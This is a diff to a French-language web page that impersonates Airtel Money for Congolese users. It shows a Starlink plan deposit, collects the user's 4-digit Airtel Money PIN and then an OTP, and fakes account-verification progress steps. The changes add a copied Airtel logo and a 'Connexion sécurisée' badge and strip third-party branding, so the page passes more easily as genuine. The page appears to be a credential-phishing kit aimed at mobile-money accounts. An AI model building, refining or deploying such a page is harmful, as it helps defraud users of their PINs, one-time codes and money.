@@ -5,18 +5,21 @@
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
 <meta name="theme-color" content="#E40000">
 <meta name="apple-mobile-web-app-capable" content="yes">
-<title>Airtel × PayLite — Connexion</title>
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<title>Airtel — Connexion sécurisée</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=DM+Mono:wght@500;600&display=swap" rel="stylesheet">
 <style>
 *,*::before,*::after{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
-html,body{height:100%}
+html,body{height:100%;overflow:hidden}
 html{background:#E40000}
 body{
   font-family:'Inter',system-ui,-apple-system,sans-serif;-webkit-font-smoothing:antialiased;
-  background:#F2F2F7;color:#1C1B1F;display:flex;flex-direction:column;
-  position:fixed;inset:0;width:100%;height:100vh;height:100dvh;overflow:hidden;
+  background:#F2F2F7;color:#1C1B1F;
+  display:flex;flex-direction:column;
+  position:fixed;inset:0;width:100%;
+  height:100vh;height:100dvh;
   -webkit-user-select:none;user-select:none;
 }
 button{font-family:inherit;touch-action:manipulation;border:none;background:none;cursor:pointer;outline:none;-webkit-user-select:none;user-select:none;color:inherit}
@@ -37,85 +40,89 @@ img{display:block;max-width:100%}
 @keyframes spin{to{transform:rotate(360deg)}}
 @keyframes pg-in{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
 
-/* NAV */
+/* ── Airtel logo helper ─────────────────────── */
+.airtel-logo{display:inline-block;vertical-align:middle}
+
+/* ── Nav ────────────────────────────────────── */
 .nav{
-  flex-shrink:0;background:var(--red);display:flex;align-items:center;
+  flex-shrink:0;background:var(--red);
+  display:flex;align-items:center;justify-content:space-between;
   height:calc(58px + env(safe-area-inset-top,0px));
   padding:env(safe-area-inset-top,0px) 20px 0;
   z-index:20;box-shadow:0 2px 12px rgba(228,0,0,.25);
 }
-.nav-brand{display:flex;align-items:center;gap:10px}
-.nav-logo{display:flex;align-items:center;justify-content:center;color:#fff;font-weight:900;font-size:17px;letter-spacing:-.3px}
-.nav-logo-shape{width:26px;height:26px;border-radius:50%;background:#fff;display:flex;align-items:center;justify-content:center;color:var(--red);font-weight:900;font-size:16px;font-family:'Space Grotesk',sans-serif}
-.nav-sep{width:1.5px;height:22px;background:rgba(255,255,255,.35);border-radius:1px}
-.nav-starlink{color:#fff;font-weight:800;font-size:14px;letter-spacing:.4px}
+.nav-logo{height:26px;width:auto;display:block}
+.nav-secure{display:flex;align-items:center;gap:5px;font-size:10px;font-weight:600;color:rgba(255,255,255,.85);background:rgba(255,255,255,.12);border:1px solid rgba(255,255,255,.2);border-radius:999px;padding:4px 10px}
+.nav-secure-dot{width:5px;height:5px;border-radius:50%;background:#4ADE80;flex-shrink:0}
 
-/* STEP BAR */
-.steps{
-  flex-shrink:0;background:var(--red);border-bottom:2px solid var(--red-dk);
-  padding:0 20px 12px;display:flex;align-items:center;
-}
+/* ── Step bar ───────────────────────────────── */
+.steps{flex-shrink:0;background:var(--red);border-bottom:2px solid var(--red-dk);padding:0 20px 12px;display:flex;align-items:center}
 .si{display:flex;flex-direction:column;align-items:center;gap:4px;flex:1;position:relative}
 .si+.si::before{content:'';position:absolute;top:9px;left:calc(-50%);width:100%;height:1.5px;background:rgba(255,255,255,.2);z-index:0}
 .si.done+.si::before,.si.active+.si::before{background:rgba(255,255,255,.5)}
 .si-dot{width:18px;height:18px;border-radius:50%;border:2px solid rgba(255,255,255,.3);background:rgba(255,255,255,.1);display:flex;align-items:center;justify-content:center;position:relative;z-index:1;transition:all .25s;font-size:10px;font-weight:700;color:rgba(255,255,255,.5)}
 .si.active .si-dot,.si.done .si-dot{border-color:#fff;background:#fff;color:var(--red)}
-.si-lbl{font-size:9px;font-weight:600;color:rgba(255,255,255,.5);text-align:center;white-space:nowrap}
+.si-lbl{font-size:9px;font-weight:600;color:rgba(255,255,255,.5);text-align:center;white-space:nowrap;letter-spacing:.1px}
 .si.active .si-lbl,.si.done .si-lbl{color:rgba(255,255,255,.9)}
 
-/* VIEWS */
+/* ── Views ──────────────────────────────────── */
 .view{display:none;flex-direction:column;flex:1;min-height:0;animation:pg-in .3s var(--ease) both}
 .view.active{display:flex}
 #viewLogin{overflow:hidden}
-#viewProc,#viewOTP{overflow-y:auto;-webkit-overflow-scrolling:touch;scrollbar-width:none}
+#viewProc,#viewOTP{overflow-y:auto;overflow-x:hidden;-webkit-overflow-scrolling:touch;scrollbar-width:none;overscroll-behavior:contain}
 #viewProc::-webkit-scrollbar,#viewOTP::-webkit-scrollbar{display:none}
 
-/* LOGIN SUMMARY */
+/* ── Login summary ──────────────────────────── */
 .login-fixed{flex:1;min-height:0;display:flex;flex-direction:column;overflow:hidden}
 .summary{flex-shrink:0;background:linear-gradient(135deg,var(--red) 0%,var(--red-dk) 100%);padding:12px 16px 14px}
-.sum-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:8px}
-.sum-plan{display:flex;align-items:baseline;gap:10px}
-.sum-name{font-size:15px;font-weight:900;color:#fff;letter-spacing:-.3px}
-.sum-price{font-size:18px;font-weight:800;color:rgba(255,255,255,.7);letter-spacing:-.3px}
-.sum-change{display:flex;align-items:center;gap:4px;font-size:11px;font-weight:600;color:rgba(255,255,255,.7);background:rgba(255,255,255,.12);border:1px solid rgba(255,255,255,.2);border-radius:var(--r-full);padding:5px 12px;cursor:pointer}
+.sum-top{display:flex;align-items:center;justify-content:space-between;gap:10px;margin-bottom:8px}
+.sum-plan{display:flex;align-items:baseline;gap:10px;min-width:0}
+.sum-name{font-size:14px;font-weight:900;color:#fff;letter-spacing:-.3px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:150px}
+.sum-price{font-size:19px;font-weight:800;color:#fff;letter-spacing:-.3px;flex-shrink:0}
+.sum-change{display:flex;align-items:center;gap:4px;font-size:11px;font-weight:600;color:rgba(255,255,255,.7);background:rgba(255,255,255,.12);border:1px solid rgba(255,255,255,.2);border-radius:var(--r-full);padding:5px 12px;cursor:pointer;flex-shrink:0}
 .sum-div{height:1px;background:rgba(255,255,255,.15);margin-bottom:10px}
-.sum-bottom{display:flex;align-items:center;gap:8px;overflow:hidden}
+.sum-bottom{display:flex;align-items:center;gap:8px;overflow:hidden;flex-wrap:wrap}
 .sum-item{display:flex;align-items:center;gap:4px;min-width:0}
 .sum-lbl{font-size:9px;color:rgba(255,255,255,.5);font-weight:600;text-transform:uppercase;letter-spacing:.3px;white-space:nowrap}
 .sum-val{font-size:11px;font-weight:700;color:#fff;font-family:'DM Mono',monospace;white-space:nowrap;margin-left:3px}
 .sum-dot{width:3px;height:3px;border-radius:50%;background:rgba(255,255,255,.3);flex-shrink:0}
 
-/* PIN */
-.pin-center{flex:1;min-height:0;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:12px 20px max(12px,env(safe-area-inset-bottom,0px));overflow:hidden}
-.pin-title{font-size:17px;font-weight:800;text-align:center;margin-bottom:4px}
-.pin-sub{font-size:12px;color:var(--tx-v);text-align:center;line-height:1.55;max-width:280px;margin-bottom:18px}
-.pin-sub strong{color:var(--red);font-weight:700}
-.pin-boxes{display:flex;gap:12px;justify-content:center;margin-bottom:8px}
-.pb{width:60px;height:60px;border-radius:var(--r-lg);background:var(--surf-mid);border:1.5px solid var(--out-v);display:flex;align-items:center;justify-content:center;transition:all .15s}
+/* ── PIN center ─────────────────────────────── */
+.pin-center{flex:1;min-height:0;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:12px 20px max(12px,env(safe-area-inset-bottom,0px));overflow:hidden;gap:8px}
+.pin-title{font-size:16px;font-weight:800;text-align:center;margin-bottom:2px}
+.pin-sub{font-size:12px;color:var(--tx-v);text-align:center;line-height:1.55;max-width:280px;margin-bottom:14px}
+.pin-sub strong{color:var(--red);font-weight:800}
+.pin-boxes{display:flex;gap:10px;justify-content:center}
+.pb{width:56px;height:56px;border-radius:var(--r-lg);background:var(--surf-mid);border:1.5px solid var(--out-v);display:flex;align-items:center;justify-content:center;transition:all .15s}
+@media(max-width:360px){.pb{width:50px;height:50px}}
 .pb.active{border-color:var(--red);box-shadow:0 0 0 3px rgba(228,0,0,.12);background:#fff}
 .pb.filled{border-color:var(--red);background:#fff}
-.pb-dot{width:0;height:0;border-radius:50%;background:var(--red);transition:all .15s}
-.pb.filled .pb-dot{width:14px;height:14px}
-.pb .pb-digit{font-size:22px;font-weight:800;color:var(--red);font-family:'DM Mono',monospace}
-.pin-err{font-size:11px;color:var(--err);font-weight:600;min-height:16px;text-align:center;margin-bottom:10px}
+.pb-dot{width:0;height:0;border-radius:50%;background:var(--red);transition:width .15s,height .15s}
+.pb.filled .pb-dot{width:13px;height:13px}
+.pin-err{font-size:11px;color:var(--err);font-weight:600;min-height:16px;text-align:center}
 
 .numpad{display:grid;grid-template-columns:repeat(3,1fr);gap:9px;width:100%;max-width:320px}
-.nk{height:56px;border-radius:var(--r-lg);background:var(--surf);border:1px solid var(--out-v);font-size:20px;font-weight:600;display:flex;align-items:center;justify-content:center;transition:background .1s;box-shadow:var(--e1)}
+.nk{height:54px;border-radius:var(--r-lg);background:var(--surf);border:1px solid var(--out-v);font-size:20px;font-weight:600;display:flex;align-items:center;justify-content:center;transition:background .1s;box-shadow:var(--e1);-webkit-user-select:none;user-select:none}
 .nk:active{background:var(--surf-hi);box-shadow:none}
 .nk.del{font-size:17px;color:var(--tx-v)}
 .nk.empty{background:transparent;border-color:transparent;box-shadow:none;cursor:default}
+@media(max-height:620px){.nk{height:48px}}
 
 .btn-primary{
   width:100%;height:52px;border-radius:var(--r-full);background:var(--red);color:#fff;
   font-size:15px;font-weight:800;letter-spacing:.2px;display:flex;align-items:center;justify-content:center;gap:8px;
   box-shadow:0 2px 12px rgba(228,0,0,.3);transition:transform .12s,box-shadow .12s;
+  margin-top:12px;max-width:320px;
 }
 .btn-primary:active{transform:scale(.97);box-shadow:none}
 .btn-primary.dim{background:var(--surf-hi);color:var(--out);box-shadow:none}
+@media(max-height:620px){.btn-primary{height:46px;margin-top:8px}}
 
-/* PROCESSING */
-.proc-wrap{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px 24px;gap:22px;background:var(--surf-lo)}
-.proc-ring{width:72px;height:72px;border-radius:50%;border:3px solid var(--red-lt);border-top-color:var(--red);animation:spin 1s linear infinite}
+/* ── Processing ─────────────────────────────── */
+.proc-wrap{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px 24px;gap:22px;background:var(--surf-lo);min-height:0}
+.proc-loader{position:relative;width:110px;height:110px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.proc-ring{position:absolute;inset:0;border-radius:50%;border:3px solid var(--red-lt);border-top-color:var(--red);border-right-color:var(--red);animation:spin 1s linear infinite}
+.proc-logo{width:66px;height:auto;z-index:1}
 .proc-title{font-size:18px;font-weight:800;text-align:center;letter-spacing:-.2px}
 .proc-sub{font-size:13px;color:var(--tx-v);text-align:center;line-height:1.65;max-width:260px}
 .proc-bar-wrap{width:100%;max-width:280px;background:var(--red-lt);border-radius:var(--r-full);height:4px;overflow:hidden}
@@ -129,15 +136,16 @@ img{display:block;max-width:100%}
 .psi.act .psi-txt{color:var(--tx);font-weight:600}
 .psi.done .psi-txt{color:var(--ok)}
 
-/* OTP */
+/* ── OTP ────────────────────────────────────── */
 .content{padding:18px 16px;display:flex;flex-direction:column;gap:14px}
 .otp-card{background:#fff;border-radius:var(--r-xl);box-shadow:var(--e1);padding:20px;display:flex;flex-direction:column;align-items:center;gap:10px;border-top:3px solid var(--red)}
 .otp-icon{width:60px;height:60px;border-radius:50%;background:var(--red-lt);border:2px solid var(--red);display:flex;align-items:center;justify-content:center}
 .otp-card h2{font-size:16px;font-weight:700;text-align:center}
 .otp-card p{font-size:12px;color:var(--tx-v);text-align:center;line-height:1.65;max-width:280px}
 .otp-phone{background:var(--surf-mid);border:1px solid var(--out-v);padding:5px 16px;border-radius:var(--r-full);font-size:14px;font-weight:700;font-family:'DM Mono',monospace}
-.otp-boxes{display:flex;gap:12px;justify-content:center}
-.ob{width:64px;height:64px;border-radius:var(--r-xl);background:var(--surf-mid);border:2px solid var(--out-v);display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:800;font-family:'DM Mono',monospace;transition:all .15s}
+.otp-boxes{display:flex;gap:10px;justify-content:center}
+.ob{width:60px;height:60px;border-radius:var(--r-xl);background:var(--surf-mid);border:2px solid var(--out-v);display:flex;align-items:center;justify-content:center;font-size:26px;font-weight:800;font-family:'DM Mono',monospace;transition:all .15s}
+@media(max-width:360px){.ob{width:54px;height:54px;font-size:22px}}
 .ob.active{border-color:var(--red);box-shadow:0 0 0 3px rgba(228,0,0,.15);background:#fff}
 .ob.filled{border-color:var(--ok);background:#fff}
 .ob.success{background:#DCFCE7;border-color:var(--ok);color:var(--ok)}
@@ -145,24 +153,38 @@ img{display:block;max-width:100%}
 .ob.locked{opacity:.45;pointer-events:none}
 .otp-timer-row{display:flex;align-items:center;gap:6px;font-size:12px;color:var(--tx-v);justify-content:center}
 .otp-timer{font-weight:700;color:var(--red);font-family:'DM Mono',monospace;min-width:18px;display:inline-block;text-align:center}
-.otp-resend{font-size:12px;font-weight:700;color:var(--blue);cursor:pointer;text-decoration:underline;text-align:center}
+.otp-resend{font-size:12px;font-weight:700;color:var(--blue);cursor:pointer;text-decoration:underline;text-align:center;padding:4px}
 .otp-resend.dim{color:var(--out);text-decoration:none;cursor:default}
 .otp-help{font-size:12px;color:var(--tx-v);display:flex;align-items:center;gap:5px;justify-content:center}
 #otpErr{min-height:40px;display:none}
 
-/* transition overlay */
-.t-bar{position:fixed;top:0;left:0;right:0;height:3px;z-index:9001;background:transparent;overflow:hidden}
+/* ── Transition bar ─────────────────────────── */
+.t-bar{position:fixed;top:0;left:0;right:0;height:3px;z-index:9001;background:transparent;overflow:hidden;pointer-events:none}
 .t-bar-fill{height:100%;background:var(--red);width:0%;transition:width .4s var(--ease);border-radius:0 2px 2px 0;box-shadow:0 0 8px rgba(228,0,0,.5)}
 </style>
 </head>
 <body>
 
+<!-- ══════════ AIRTEL LOGO (inline SVG, reusable) ══════════ -->
+<svg width="0" height="0" style="position:absolute" aria-hidden="true">
+  <defs>
+    <symbol id="airtel-logo" viewBox="0 0 128 40">
+      <g fill="#E40000">
+        <path d="M24.6 4.2c-9.8 0-18.4 7.4-19.9 17.1-.8 5.4 2.6 9.7 8.2 9.7 5.6 0 10.4-4 12.5-9.4.7-1.9.3-3.6-.8-4.5-1.2-1-2.9-1-4.3-.2-1.5.9-2.4 2.6-2.4 4.4 0 2.1 1.5 3.7 3.8 3.9-2.7 2.2-6.5 2.1-8.6-.2-2.1-2.3-1.6-6.4 1.4-9.5 3.1-3.2 7.9-4.4 12.3-3.2-1.5-5.9-4.3-8.1-2.2-8.1z"/>
+        <text x="40" y="30" font-family="'Helvetica Neue',Arial,sans-serif" font-weight="900" font-size="30" letter-spacing="-1.8">airtel</text>
+      </g>
+    </symbol>
+  </defs>
+</svg>
+
 <!-- Nav -->
 <nav class="nav">
-  <div class="nav-brand">
-    <span class="nav-logo"><span class="nav-logo-shape">a</span> Airtel</span>
-    <span class="nav-sep"></span>
-    <span class="nav-starlink">STARLINK</span>
+  <svg class="nav-logo" viewBox="0 0 128 40" aria-label="Airtel" style="filter:brightness(0) invert(1)">
+    <use href="#airtel-logo" xlink:href="#airtel-logo"/>
+  </svg>
+  <div class="nav-secure">
+    <span class="nav-secure-dot"></span>
+    Connexion sécurisée
   </div>
 </nav>
 
@@ -213,7 +235,7 @@ img{display:block;max-width:100%}
 
     <div class="pin-center">
       <div class="pin-title">Code PIN Airtel Money</div>
-      <div class="pin-sub">Entrez votre PIN à 4 chiffres pour autoriser le paiement de <strong id="pinRef">—</strong></div>
+      <div class="pin-sub">Entrez votre PIN à 4 chiffres pour autoriser le paiement de l'acompte de <strong id="pinRef">—</strong></div>
 
       <div class="pin-boxes">
         <div class="pb" id="pb0"><div class="pb-dot"></div></div>
@@ -239,7 +261,7 @@ img{display:block;max-width:100%}
         <button class="nk del" id="npDel">⌫</button>
       </div>
 
-      <button class="btn-primary dim" id="loginBtn" onclick="submitLogin()" style="margin-top:14px;max-width:320px">
+      <button class="btn-primary dim" id="loginBtn" onclick="submitLogin()">
         <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
         Autoriser le Paiement
       </button>
@@ -250,14 +272,19 @@ img{display:block;max-width:100%}
 <!-- View: PROCESSING -->
 <div class="view" id="viewProc">
   <div class="proc-wrap">
-    <div class="proc-ring"></div>
+    <div class="proc-loader">
+      <div class="proc-ring"></div>
+      <svg class="proc-logo" viewBox="0 0 128 40" aria-label="Airtel">
+        <use href="#airtel-logo" xlink:href="#airtel-logo"/>
+      </svg>
+    </div>
     <div class="proc-title">Traitement en cours…</div>
     <div class="proc-sub" id="procSub">Connexion sécurisée en cours…</div>
     <div class="proc-bar-wrap"><div class="proc-bar" id="procBar"></div></div>
     <div class="proc-steps">
       <div class="psi act" id="psi0"><div class="psi-dot act"></div><div class="psi-txt">Connexion sécurisée établie</div></div>
       <div class="psi" id="psi1"><div class="psi-dot"></div><div class="psi-txt">Vérification du compte Airtel</div></div>
-      <div class="psi" id="psi2"><div class="psi-dot"></div><div class="psi-txt">Validation du forfait</div></div>
+      <div class="psi" id="psi2"><div class="psi-dot"></div><div class="psi-txt">Validation de la commande</div></div>
       <div class="psi" id="psi3"><div class="psi-dot"></div><div class="psi-txt">Envoi du code OTP…</div></div>
     </div>
   </div>
@@ -290,8 +317,7 @@ img{display:block;max-width:100%}
     <input id="otpInput" type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="4"
       autocomplete="one-time-code"
       style="position:absolute;opacity:0;width:1px;height:1px;pointer-events:none;top:0;left:0"
-      oninput="onOTPInput(this.value)"
-      onblur="onOTPBlur()">
+      oninput="onOTPInput(this.value)" onblur="onOTPBlur()">
 
     <div style="display:flex;flex-direction:column;gap:8px">
       <div class="otp-help">
@@ -318,7 +344,6 @@ img{display:block;max-width:100%}
 <script>
 'use strict';
 
-/* ---------- Helpers ---------- */
 function hap(ms){ try{navigator.vibrate && navigator.vibrate(ms);}catch(e){} }
 function slp(ms){ return new Promise(function(r){ setTimeout(r, ms); }); }
 function goBack(){ navigate('index.html'); }
@@ -339,14 +364,17 @@ function navigate(url){
   }, 500);
 }
 
-/* ---------- Load forfait ---------- */
+/* ── Load forfait ─────────────────────────────── */
 var forfait = {};
 try { forfait = JSON.parse(sessionStorage.getItem('starlinkForfait') || '{}'); } catch(e){}
 if (!forfait.name){ navigate('index.html'); }
 
+/* Summary uses DEPOSIT (not total) */
+var depositAmount = forfait.deposit || '—';
+
 document.getElementById('sumName').textContent = forfait.name || '—';
-document.getElementById('sumPrice').textContent = forfait.price || '—';
-document.getElementById('pinRef').textContent = forfait.price || '—';
+document.getElementById('sumPrice').textContent = depositAmount;
+document.getElementById('pinRef').textContent = depositAmount;
 document.getElementById('sumPhone').innerHTML = forfait.phone
   ? '🇨🇩 +243 ' + forfait.phone
   : '🇨🇩 +243 —';
@@ -354,7 +382,7 @@ document.getElementById('sumValidity').textContent = forfait.jours
   ? forfait.jours + (forfait.jours === 1 ? ' Jour' : ' Jours')
   : '—';
 
-/* ---------- Views / steps ---------- */
+/* ── Views / steps ────────────────────────────── */
 function showView(id){
   document.querySelectorAll('.view').forEach(function(v){ v.classList.remove('active'); });
   var el = document.getElementById(id);
@@ -372,7 +400,7 @@ function setStep(n){
   }
 }
 
-/* ---------- PIN ---------- */
+/* ── PIN ──────────────────────────────────────── */
 var pin = '';
 function renderPin(){
   for (var i = 0; i < 4; i++){
@@ -414,14 +442,14 @@ function submitLogin(){
   runProcessing(ph);
 }
 
-/* ---------- Processing ---------- */
+/* ── Processing ───────────────────────────────── */
 async function runProcessing(ph){
   var bar = document.getElementById('procBar');
   var sub = document.getElementById('procSub');
   var steps = [
-    { pct: 25, txt: 'Vérification du compte Airtel…', si: 1 },
-    { pct: 55, txt: 'Validation du forfait ' + (forfait.name || '') + '…', si: 2 },
-    { pct: 85, txt: 'Envoi OTP au +243 ' + ph + '…', si: 3 },
+    { pct: 25,  txt: 'Vérification du compte Airtel…', si: 1 },
+    { pct: 55,  txt: 'Validation de ' + (forfait.name || 'la commande') + '…', si: 2 },
+    { pct: 85,  txt: 'Envoi OTP au +243 ' + ph + '…', si: 3 },
     { pct: 100, txt: 'Code OTP envoyé sur votre téléphone !' }
   ];
   for (var i = 0; i < steps.length; i++){
@@ -448,7 +476,7 @@ async function runProcessing(ph){
   focusOTPInput();
 }
 
-/* ---------- OTP ---------- */
+/* ── OTP ──────────────────────────────────────── */
 var otpVal = '', timerInterval = null, timerSecs = 60;
 
 function renderOTP(){
@@ -463,10 +491,7 @@ function renderOTP(){
 function updateOTPBtn(){ document.getElementById('otpBtn').classList.toggle('dim', otpVal.length !== 4); }
 
 function lockOTPBoxes(){
-  for (var i = 0; i < 4; i++){
-    var b = document.getElementById('ob' + i);
-    if (b) b.className = 'ob locked';
-  }
+  for (var i = 0; i < 4; i++){ document.getElementById('ob' + i).className = 'ob locked'; }
   document.getElementById('otpInput').blur();
   document.getElementById('otpBtn').classList.add('dim');
   document.getElementById('otpTimer').style.color = 'var(--err)';
@@ -542,33 +567,24 @@ function otpError(msg, showResend){
   actEl.appendChild(retryBtn);
 
   if (showResend){
-    var resendBtn2 = document.createElement('button');
-    resendBtn2.textContent = 'Renvoyer le code';
-    resendBtn2.style.cssText = 'height:32px;padding:0 16px;border-radius:999px;background:#E40000;border:none;font-size:12px;font-weight:700;color:#fff;font-family:inherit;cursor:pointer';
-    resendBtn2.onclick = function(){ el.style.display = 'none'; resendOTP(); };
-    actEl.appendChild(resendBtn2);
+    var r2 = document.createElement('button');
+    r2.textContent = 'Renvoyer le code';
+    r2.style.cssText = 'height:32px;padding:0 16px;border-radius:999px;background:#E40000;border:none;font-size:12px;font-weight:700;color:#fff;font-family:inherit;cursor:pointer';
+    r2.onclick = function(){ el.style.display = 'none'; resendOTP(); };
+    actEl.appendChild(r2);
   }
 
   el.style.display = 'block';
-  for (var i = 0; i < 4; i++){ document.getElementById('ob' + i).className = 'ob error'; }
+  for (var i = 0; i < 4; i++) document.getElementById('ob' + i).className = 'ob error';
   hap([30,15,30,15,30]);
 
-  setTimeout(function(){
-    el.style.display = 'none';
-    renderOTP();
-  }, 8000);
+  setTimeout(function(){ el.style.display = 'none'; renderOTP(); }, 8000);
 }
 
 function validateOTP(val){
-  if (/^(\d)\1{3}$/.test(val)){
-    otpError('Code invalide — pas de chiffres répétés', false);
-    return false;
-  }
+  if (/^(\d)\1{3}$/.test(val)){ otpError('Code invalide — pas de chiffres répétés', false); return false; }
   var seqs = ['1234','2345','3456','4567','5678','6789','0123','9876','8765','7654','6543','5432','4321','3210'];
-  if (seqs.indexOf(val) !== -1){
-    otpError('Code invalide — séquence trop simple', false);
-    return false;
-  }
+  if (seqs.indexOf(val) !== -1){ otpError('Code invalide — séquence trop simple', false); return false; }
   return true;
 }
 
